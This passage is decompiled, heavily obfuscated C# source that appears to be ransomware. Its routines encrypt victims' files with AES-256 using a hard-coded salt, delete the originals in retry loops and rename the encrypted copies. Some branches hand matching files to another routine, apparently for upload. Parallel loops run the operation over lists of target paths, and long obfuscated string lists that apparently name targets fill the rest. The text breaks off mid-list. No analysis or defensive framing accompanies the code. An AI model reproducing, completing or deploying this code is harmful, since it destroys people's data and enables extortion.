								if (CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ != mDsrdwsfBAgqx.getString_0(107386219))
								{
									XZXEHUgcqrufd(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, bytes);
								}
								else
								{
									XZXEHUgcqrufd(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, bytes);
								}
							}
						}
						end_IL_087f:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1036;
			IL_1036:
			CS_0024_003C_003E8__locals0.vJUzSMoRbycwzG.Remove(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
		});
	}

	private static void WyOQIuKbfF(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (DXDIUZMazYGZy == getString_0(107396791))
					{
						foreach (string item in YoPwmbBPpdD)
						{
							if (string_0.ToLower().EndsWith(item) && HFFrRFIpQgjXI == getString_0(107396791))
							{
								if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										yWTIBbUKdpiy.ybntlhJHhisLb(getString_0(107389866), getString_0(107389861), getString_0(107389816), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && HFFrRFIpQgjXI == getString_0(107396615))
							{
								try
								{
									yWTIBbUKdpiy.ybntlhJHhisLb(getString_0(107389866), getString_0(107389861), getString_0(107389816), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107386196)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107386196), getString_0(107389241)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void TMqDmSiJWGfZdl(string KxsVAxWoHhvN, string ZWXRhIgnSPTCGD, byte[] slSRvUPBKwAMXi, byte[] gTVUpEQMEmpCdQ = null)
	{
		try
		{
			if (DXDIUZMazYGZy == getString_0(107396791))
			{
				FileStream fileStream = new FileStream(KxsVAxWoHhvN, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in YoPwmbBPpdD)
				{
					if (KxsVAxWoHhvN.ToLower().EndsWith(item) && HFFrRFIpQgjXI == getString_0(107396791))
					{
						if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								yWTIBbUKdpiy.ybntlhJHhisLb(getString_0(107389866), getString_0(107389861), getString_0(107389816), KxsVAxWoHhvN);
							}
							catch
							{
							}
						}
					}
					else if (KxsVAxWoHhvN.ToLower().EndsWith(item) && HFFrRFIpQgjXI == getString_0(107396615))
					{
						try
						{
							yWTIBbUKdpiy.ybntlhJHhisLb(getString_0(107389866), getString_0(107389861), getString_0(107389816), KxsVAxWoHhvN);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (KxsVAxWoHhvN != ZWXRhIgnSPTCGD)
		{
			File.Move(KxsVAxWoHhvN, ZWXRhIgnSPTCGD);
			KxsVAxWoHhvN = ZWXRhIgnSPTCGD;
		}
		byte[] bytes = sAdFSOOagDt.tbzmVxgbIeuZ(File.ReadAllBytes(KxsVAxWoHhvN), slSRvUPBKwAMXi, gTVUpEQMEmpCdQ);
		File.WriteAllBytes(KxsVAxWoHhvN, bytes);
		qXIAEocyZgLqByS++;
	}

	private static void fsRkhosBCvdFpjZ(string string_0, string string_1, byte[] byte_0)
	{
		cTttKVwFNmpq CS_0024_003C_003E8__locals0 = new cTttKVwFNmpq();
		CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm = string_0;
		CS_0024_003C_003E8__locals0.eedfnXcwSQkQNFbIx = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string eedfnXcwSQkQNFbIx = CS_0024_003C_003E8__locals0.eedfnXcwSQkQNFbIx;
			FileStream fileStream = new FileStream(eedfnXcwSQkQNFbIx, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (QtTrkEhpkGUJgMO == getString_0(107396791))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm, FileMode.Open);
				int num2;
				while ((num2 = fileStream2.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num2);
				}
				fileStream2.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.eedfnXcwSQkQNFbIx.Length > 0)
				{
					if (DXDIUZMazYGZy == getString_0(107396791))
					{
						FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in YoPwmbBPpdD)
						{
							if (CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm.ToLower().EndsWith(item) && HFFrRFIpQgjXI == getString_0(107396791))
							{
								if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										yWTIBbUKdpiy.ybntlhJHhisLb(getString_0(107389866), getString_0(107389861), getString_0(107389816), CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm.ToLower().EndsWith(item) && HFFrRFIpQgjXI == getString_0(107396615))
							{
								try
								{
									yWTIBbUKdpiy.ybntlhJHhisLb(getString_0(107389866), getString_0(107389861), getString_0(107389816), CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm);
								}
								catch
								{
								}
							}
						}
						fileStream3.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.eedfnXcwSQkQNFbIx.EndsWith(getString_0(107386196)))
					{
						File.Move(CS_0024_003C_003E8__locals0.eedfnXcwSQkQNFbIx, CS_0024_003C_003E8__locals0.eedfnXcwSQkQNFbIx.Replace(getString_0(107386196), getString_0(107389241)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.eedfnXcwSQkQNFbIx))
							{
								File.Delete(CS_0024_003C_003E8__locals0.eedfnXcwSQkQNFbIx);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386973) + CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm + getString_0(107386219) + ex2.Message + getString_0(107395711));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> vfIRuRDoHW = VfIRuRDoHW;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
			{
				xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(getString_0(107386134)), string_0);
			};
		}
		Parallel.ForEach(vfIRuRDoHW, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		List<string> zSMEaXFyFht = ZSMEaXFyFht;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(getString_0(107386153)), string_0);
			};
		}
		Parallel.ForEach(zSMEaXFyFht, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		if (EYUcFTYiTRnwV == getString_0(107396791))
		{
			string[] yacSoacXjaCUC = YacSoacXjaCUC;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
				{
					xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(getString_0(107386153)), getString_0(107386128) + string_0 + getString_0(107386119));
				};
			}
			Parallel.ForEach(yacSoacXjaCUC, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		}
		if (!oZZPobIwxSNjCO().Contains(getString_0(107386839)))
		{
			wDQhPDGrMto(edpjkmWiBB);
		}
		else
		{
			List<string> oKgBAQeRHSlym = OKgBAQeRHSlym;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(TfBMtOaYnyXfeqqRN(getString_0(107386082))), string_0);
				};
			}
			Parallel.ForEach(oKgBAQeRHSlym, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		List<string> source = pmzwKqsyDlmmF;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(getString_0(107386089)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(getString_0(107386134)), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(getString_0(107386153)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(getString_0(107386153)), getString_0(107386128) + string_0 + getString_0(107386119));
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(TfBMtOaYnyXfeqqRN(getString_0(107386082))), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(getString_0(107386089)), string_0);
	}

	static GhAMvbuoccW()
	{
		Strings.CreateGetStringDelegate(typeof(GhAMvbuoccW));
		gheRqfduEuJ = getString_0(107389460);
		bGfpmpYMCsNkyjcK = null;
		HirTGWkSHczrmbY = getString_0(107396615);
		nsiwXjKpMUO = getString_0(107386040);
		ZmKssmQIdPi = new List<string>();
		sjbNOeTfHdjfd = new List<string>();
		zMQimCitOD = getString_0(107396615);
		MXXPCoXZKEzPC = getString_0(107389241);
		sTQyJSLcZOIiC = getString_0(107389241);
		EXVykcHaTCNay = getString_0(107389241);
		szjPprKwdybiP = getString_0(107396615);
		IwCCvRldil = 0;
		BBqvZtJMKtZyzF = getString_0(107396615);
		MkWPFkyuHrLz = getString_0(107396615);
		tGBTkHzktdbqpsN = getString_0(107396615);
		IHkGIfOFsBs = getString_0(107386059);
		PktefsOLxgM = getString_0(107396615);
		lvMwbEyyvL = getString_0(107396615);
		btzEVEliaCMI = getString_0(107396615);
		DhKuNmjsjM = getString_0(107396615);
		FBdBqWxFZQgyhcDd = new List<string>
		{
			PbsdnvfpwWRvGCs(getString_0(107386054)),
			PbsdnvfpwWRvGCs(getString_0(107386005)),
			PbsdnvfpwWRvGCs(getString_0(107385980)),
			PbsdnvfpwWRvGCs(getString_0(107385995)),
			PbsdnvfpwWRvGCs(getString_0(107386482)),
			PbsdnvfpwWRvGCs(getString_0(107386425)),
			PbsdnvfpwWRvGCs(getString_0(107386440)),
			PbsdnvfpwWRvGCs(getString_0(107386415)),
			PbsdnvfpwWRvGCs(getString_0(107386358)),
			PbsdnvfpwWRvGCs(getString_0(107386333)),
			PbsdnvfpwWRvGCs(getString_0(107386348)),
			PbsdnvfpwWRvGCs(getString_0(107386291)),
			PbsdnvfpwWRvGCs(getString_0(107386266))
		};
		HMEbcaxMfcYzgl = new List<string>();
		wbKIZmscSBasobt = getString_0(107396615);
		dVUrkAuvmqKS = getString_0(107396615);
		uSiPWDmilru = getString_0(107396615);
		SNtBTLidlROtoV = new List<string>();
		OcAolhvchhcmQ = getString_0(107396615);
		emRwjmkqcwElZk = getString_0(107386241);
		rmNaxrdaErS = getString_0(107396791);
		nnUkiNRMVi = getString_0(107396615);
		BjijgdTbDd = new List<string>
		{
			PbsdnvfpwWRvGCs(getString_0(107385712)),
			PbsdnvfpwWRvGCs(getString_0(107385679)),
			PbsdnvfpwWRvGCs(getString_0(107385646)),
			PbsdnvfpwWRvGCs(getString_0(107385613)),
			PbsdnvfpwWRvGCs(getString_0(107385580)),
			PbsdnvfpwWRvGCs(getString_0(107385551)),
			PbsdnvfpwWRvGCs(getString_0(107385462)),
			PbsdnvfpwWRvGCs(getString_0(107385945)),
			PbsdnvfpwWRvGCs(getString_0(107385932)),
			PbsdnvfpwWRvGCs(getString_0(107385867)),
			PbsdnvfpwWRvGCs(getString_0(107385834)),
			PbsdnvfpwWRvGCs(getString_0(107385801)),
			PbsdnvfpwWRvGCs(getString_0(107385768)),
			PbsdnvfpwWRvGCs(getString_0(107385739)),
			PbsdnvfpwWRvGCs(getString_0(107385198)),
			PbsdnvfpwWRvGCs(getString_0(107385157)),
			PbsdnvfpwWRvGCs(getString_0(107385084)),
			PbsdnvfpwWRvGCs(getString_0(107385059)),
			PbsdnvfpwWRvGCs(getString_0(107385010)),
			PbsdnvfpwWRvGCs(getString_0(107384977)),
			PbsdnvfpwWRvGCs(getString_0(107385428)),
			PbsdnvfpwWRvGCs(getString_0(107385419)),
			PbsdnvfpwWRvGCs(getString_0(107385346)),
			PbsdnvfpwWRvGCs(getString_0(107385313)),
			PbsdnvfpwWRvGCs(getString_0(107385296)),
			PbsdnvfpwWRvGCs(getString_0(107385207)),
			PbsdnvfpwWRvGCs(getString_0(107384686)),
			PbsdnvfpwWRvGCs(getString_0(107384657)),
			PbsdnvfpwWRvGCs(getString_0(107384616)),
			PbsdnvfpwWRvGCs(getString_0(107384559)),
			PbsdnvfpwWRvGCs(getString_0(107384494)),
			PbsdnvfpwWRvGCs(getString_0(107384917)),
			PbsdnvfpwWRvGCs(getString_0(107384852)),
			PbsdnvfpwWRvGCs(getString_0(107384835)),
			PbsdnvfpwWRvGCs(getString_0(107384738)),
			PbsdnvfpwWRvGCs(getString_0(107384713)),
			PbsdnvfpwWRvGCs(getString_0(107384168)),
			PbsdnvfpwWRvGCs(getString_0(107384095)),
			PbsdnvfpwWRvGCs(getString_0(107384054)),
			PbsdnvfpwWRvGCs(getString_0(107384041)),
			PbsdnvfpwWRvGCs(getString_0(107384012)),
			PbsdnvfpwWRvGCs(getString_0(107383947)),
			PbsdnvfpwWRvGCs(getString_0(107384386)),
			PbsdnvfpwWRvGCs(getString_0(107384353)),
			PbsdnvfpwWRvGCs(getString_0(107384312)),
			PbsdnvfpwWRvGCs(getString_0(107384295)),
			PbsdnvfpwWRvGCs(getString_0(107384218)),
			PbsdnvfpwWRvGCs(getString_0(107383665)),
			PbsdnvfpwWRvGCs(getString_0(107383620)),
			PbsdnvfpwWRvGCs(getString_0(107383543)),
			PbsdnvfpwWRvGCs(getString_0(107383530)),
			PbsdnvfpwWRvGCs(getString_0(107383457)),
			PbsdnvfpwWRvGCs(getString_0(107383896)),
			PbsdnvfpwWRvGCs(getString_0(107383867)),
			PbsdnvfpwWRvGCs(getString_0(107383858)),
			PbsdnvfpwWRvGCs(getString_0(107383793)),
			PbsdnvfpwWRvGCs(getString_0(107383748)),
			PbsdnvfpwWRvGCs(getString_0(107383719)),
			PbsdnvfpwWRvGCs(getString_0(107383130)),
			PbsdnvfpwWRvGCs(getString_0(107383065)),
			PbsdnvfpwWRvGCs(getString_0(107383036)),
			PbsdnvfpwWRvGCs(getString_0(107383011)),
			PbsdnvfpwWRvGCs(getString_0(107382914)),
			PbsdnvfpwWRvGCs(getString_0(107383385)),
			PbsdnvfpwWRvGCs(getString_0(107383356)),
			PbsdnvfpwWRvGCs(getString_0(107383315)),
			PbsdnvfpwWRvGCs(getString_0(107383234)),
			PbsdnvfpwWRvGCs(getString_0(107383205)),
			PbsdnvfpwWRvGCs(getString_0(107382588)),
			PbsdnvfpwWRvGCs(getString_0(107382575)),
			PbsdnvfpwWRvGCs(getString_0(107382542)),
			PbsdnvfpwWRvGCs(getString_0(107382501)),
			PbsdnvfpwWRvGCs(getString_0(107382392)),
			PbsdnvfpwWRvGCs(getString_0(107382891)),
			PbsdnvfpwWRvGCs(getString_0(107382802)),
			PbsdnvfpwWRvGCs(getString_0(107382721)),
			PbsdnvfpwWRvGCs(getString_0(107382724)),
			PbsdnvfpwWRvGCs(getString_0(107382651)),
			PbsdnvfpwWRvGCs(getString_0(107382074)),
			PbsdnvfpwWRvGCs(getString_0(107382057)),
			PbsdnvfpwWRvGCs(getString_0(107382000)),
			PbsdnvfpwWRvGCs(getString_0(107381967)),
			PbsdnvfpwWRvGCs(getString_0(107381906)),
			PbsdnvfpwWRvGCs(getString_0(107382329)),
			PbsdnvfpwWRvGCs(getString_0(107384713)),
			PbsdnvfpwWRvGCs(getString_0(107382272)),
			PbsdnvfpwWRvGCs(getString_0(107382231)),
			PbsdnvfpwWRvGCs(getString_0(107382142)),
			PbsdnvfpwWRvGCs(getString_0(107381617)),
			PbsdnvfpwWRvGCs(getString_0(107381524)),
			PbsdnvfpwWRvGCs(getString_0(107381499)),
			PbsdnvfpwWRvGCs(getString_0(107381486)),
			PbsdnvfpwWRvGCs(getString_0(107381405)),
			PbsdnvfpwWRvGCs(getString_0(107384559)),
			PbsdnvfpwWRvGCs(getString_0(107381852)),
			PbsdnvfpwWRvGCs(getString_0(107381811)),
			PbsdnvfpwWRvGCs(getString_0(107381754)),
			PbsdnvfpwWRvGCs(getString_0(107384494)),
			PbsdnvfpwWRvGCs(getString_0(107381713)),
			PbsdnvfpwWRvGCs(getString_0(107381632)),
			PbsdnvfpwWRvGCs(getString_0(107381063)),
			PbsdnvfpwWRvGCs(getString_0(107380998)),
			PbsdnvfpwWRvGCs(getString_0(107380917)),
			PbsdnvfpwWRvGCs(getString_0(107384852)),
			PbsdnvfpwWRvGCs(getString_0(107380872)),
			PbsdnvfpwWRvGCs(getString_0(107384168)),
			PbsdnvfpwWRvGCs(getString_0(107384835)),
			PbsdnvfpwWRvGCs(getString_0(107381351)),
			PbsdnvfpwWRvGCs(getString_0(107381294)),
			PbsdnvfpwWRvGCs(getString_0(107384738)),
			PbsdnvfpwWRvGCs(getString_0(107381261)),
			PbsdnvfpwWRvGCs(getString_0(107381180)),
			PbsdnvfpwWRvGCs(getString_0(107381163)),
			PbsdnvfpwWRvGCs(getString_0(107384616)),
			PbsdnvfpwWRvGCs(getString_0(107381138)),
			PbsdnvfpwWRvGCs(getString_0(107413349)),
			PbsdnvfpwWRvGCs(getString_0(107413320)),
			PbsdnvfpwWRvGCs(getString_0(107413291)),
			PbsdnvfpwWRvGCs(getString_0(107413214)),
			PbsdnvfpwWRvGCs(getString_0(107413181)),
			PbsdnvfpwWRvGCs(getString_0(107413188)),
			PbsdnvfpwWRvGCs(getString_0(107413111)),
			PbsdnvfpwWRvGCs(getString_0(107413598)),
			PbsdnvfpwWRvGCs(getString_0(107413557)),
			PbsdnvfpwWRvGCs(getString_0(107413544)),
			PbsdnvfpwWRvGCs(getString_0(107413463)),
			PbsdnvfpwWRvGCs(getString_0(107413406)),
			PbsdnvfpwWRvGCs(getString_0(107413373)),
			PbsdnvfpwWRvGCs(getString_0(107412848)),
			PbsdnvfpwWRvGCs(getString_0(107412815)),
			PbsdnvfpwWRvGCs(getString_0(107412774)),
			PbsdnvfpwWRvGCs(getString_0(107384657)),
			PbsdnvfpwWRvGCs(getString_0(107413463)),
			PbsdnvfpwWRvGCs(getString_0(107412701)),
			PbsdnvfpwWRvGCs(getString_0(107412672)),
			PbsdnvfpwWRvGCs(getString_0(107412675)),
			PbsdnvfpwWRvGCs(getString_0(107412626)),
			PbsdnvfpwWRvGCs(getString_0(107413097)),
			PbsdnvfpwWRvGCs(getString_0(107413036)),
			PbsdnvfpwWRvGCs(getString_0(107412963)),
			PbsdnvfpwWRvGCs(getString_0(107412934)),
			PbsdnvfpwWRvGCs(getString_0(107412901)),
			PbsdnvfpwWRvGCs(getString_0(107412284)),
			PbsdnvfpwWRvGCs(getString_0(107412255)),
			PbsdnvfpwWRvGCs(getString_0(107412242)),
			PbsdnvfpwWRvGCs(getString_0(107412177)),
			PbsdnvfpwWRvGCs(getString_0(107412144)),
			PbsdnvfpwWRvGCs(getString_0(107412099)),
			PbsdnvfpwWRvGCs(getString_0(107412550)),
			PbsdnvfpwWRvGCs(getString_0(107412517)),
			PbsdnvfpwWRvGCs(getString_0(107412440)),
			PbsdnvfpwWRvGCs(getString_0(107412375)),
			PbsdnvfpwWRvGCs(getString_0(107412342)),
			PbsdnvfpwWRvGCs(getString_0(107411821)),
			PbsdnvfpwWRvGCs(getString_0(107411740)),
			PbsdnvfpwWRvGCs(getString_0(107385296)),
			PbsdnvfpwWRvGCs(getString_0(107411711)),
			PbsdnvfpwWRvGCs(getString_0(107411686)),
			PbsdnvfpwWRvGCs(getString_0(107411613)),
			PbsdnvfpwWRvGCs(getString_0(107411600)),
			PbsdnvfpwWRvGCs(getString_0(107412071)),
			PbsdnvfpwWRvGCs(getString_0(107411994)),
			PbsdnvfpwWRvGCs(getString_0(107411933)),
			PbsdnvfpwWRvGCs(getString_0(107411916)),
			PbsdnvfpwWRvGCs(getString_0(107411835)),
			PbsdnvfpwWRvGCs(getString_0(107411266)),
			PbsdnvfpwWRvGCs(getString_0(107411241)),
			PbsdnvfpwWRvGCs(getString_0(107411164)),
			PbsdnvfpwWRvGCs(getString_0(107411123)),
			PbsdnvfpwWRvGCs(getString_0(107411066)),
			PbsdnvfpwWRvGCs(getString_0(107385207)),
			PbsdnvfpwWRvGCs(getString_0(107411537)),
			PbsdnvfpwWRvGCs(getString_0(107411476)),
			PbsdnvfpwWRvGCs(getString_0(107411443)),
			PbsdnvfpwWRvGCs(getString_0(107411434)),
			PbsdnvfpwWRvGCs(getString_0(107411405)),
			PbsdnvfpwWRvGCs(getString_0(107385313)),
			PbsdnvfpwWRvGCs(getString_0(107411364)),
			PbsdnvfpwWRvGCs(getString_0(107410771)),
			PbsdnvfpwWRvGCs(getString_0(107410742)),
			PbsdnvfpwWRvGCs(getString_0(107383036)),
			PbsdnvfpwWRvGCs(getString_0(107410709)),
			PbsdnvfpwWRvGCs(getString_0(107410742)),
			PbsdnvfpwWRvGCs(getString_0(107410680)),
			PbsdnvfpwWRvGCs(getString_0(107410651)),
			PbsdnvfpwWRvGCs(getString_0(107410622)),
			PbsdnvfpwWRvGCs(getString_0(107410605)),
			PbsdnvfpwWRvGCs(getString_0(107411036)),
			PbsdnvfpwWRvGCs(getString_0(107410995)),
			PbsdnvfpwWRvGCs(getString_0(107410934)),
			PbsdnvfpwWRvGCs(getString_0(107410905)),
			PbsdnvfpwWRvGCs(getString_0(107410896)),
			PbsdnvfpwWRvGCs(getString_0(107410851)),
			PbsdnvfpwWRvGCs(getString_0(107410262)),
			PbsdnvfpwWRvGCs(getString_0(107410229)),
			PbsdnvfpwWRvGCs(getString_0(107410172)),
			PbsdnvfpwWRvGCs(getString_0(107410159)),
			PbsdnvfpwWRvGCs(getString_0(107410070)),
			PbsdnvfpwWRvGCs(getString_0(107410037)),
			PbsdnvfpwWRvGCs(getString_0(107410540)),
			PbsdnvfpwWRvGCs(getString_0(107410511)),
			PbsdnvfpwWRvGCs(getString_0(107410450)),
			PbsdnvfpwWRvGCs(getString_0(107410417)),
			PbsdnvfpwWRvGCs(getString_0(107410328)),
			PbsdnvfpwWRvGCs(getString_0(107410319)),
			PbsdnvfpwWRvGCs(getString_0(107409726)),
			PbsdnvfpwWRvGCs(getString_0(107409693)),
			PbsdnvfpwWRvGCs(getString_0(107409676)),
			PbsdnvfpwWRvGCs(getString_0(107409599)),
			PbsdnvfpwWRvGCs(getString_0(107409582)),
			PbsdnvfpwWRvGCs(getString_0(107410017)),
			PbsdnvfpwWRvGCs(getString_0(107410000)),
			PbsdnvfpwWRvGCs(getString_0(107409967)),
			PbsdnvfpwWRvGCs(getString_0(107409926)),
			PbsdnvfpwWRvGCs(getString_0(107409853)),
			PbsdnvfpwWRvGCs(getString_0(107409840)),
			PbsdnvfpwWRvGCs(getString_0(107413097)),
			PbsdnvfpwWRvGCs(getString_0(107409807)),
			PbsdnvfpwWRvGCs(getString_0(107409254)),
			PbsdnvfpwWRvGCs(getString_0(107409197)),
			PbsdnvfpwWRvGCs(getString_0(107409168)),
			PbsdnvfpwWRvGCs(getString_0(107409135)),
			PbsdnvfpwWRvGCs(getString_0(107409102)),
			PbsdnvfpwWRvGCs(getString_0(107409021)),
			PbsdnvfpwWRvGCs(getString_0(107409504)),
			PbsdnvfpwWRvGCs(getString_0(107409459)),
			PbsdnvfpwWRvGCs(getString_0(107409446)),
			PbsdnvfpwWRvGCs(getString_0(107409373)),
			PbsdnvfpwWRvGCs(getString_0(107409348)),
			PbsdnvfpwWRvGCs(getString_0(107409267)),
			PbsdnvfpwWRvGCs(getString_0(107408726)),
			PbsdnvfpwWRvGCs(getString_0(107408713))
		};
		VfIRuRDoHW = new List<string>
		{
			PbsdnvfpwWRvGCs(getString_0(107408640)),
			PbsdnvfpwWRvGCs(getString_0(107408623)),
			PbsdnvfpwWRvGCs(getString_0(107408542)),
			PbsdnvfpwWRvGCs(getString_0(107408525)),
			PbsdnvfpwWRvGCs(getString_0(107408956)),
			PbsdnvfpwWRvGCs(getString_0(107408891)),
			PbsdnvfpwWRvGCs(getString_0(107408846)),
			PbsdnvfpwWRvGCs(getString_0(107408785))
		};
		ZSMEaXFyFht = new List<string>
		{
			PbsdnvfpwWRvGCs(getString_0(107408184)),
			PbsdnvfpwWRvGCs(getString_0(107408151)),
			PbsdnvfpwWRvGCs(getString_0(107408138)),
			PbsdnvfpwWRvGCs(getString_0(107408057)),
			PbsdnvfpwWRvGCs(getString_0(107408024)),
			PbsdnvfpwWRvGCs(getString_0(107408007)),
			PbsdnvfpwWRvGCs(getString_0(107408442)),
			PbsdnvfpwWRvGCs(getString_0(107408409)),
			PbsdnvfpwWRvGCs(getString_0(107408376)),
			PbsdnvfpwWRvGCs(getString_0(107408343)),
			PbsdnvfpwWRvGCs(getString_0(107408310)),
			PbsdnvfpwWRvGCs(getString_0(107408277)),
			PbsdnvfpwWRvGCs(getString_0(107408268)),
			PbsdnvfpwWRvGCs(getString_0(107407715)),
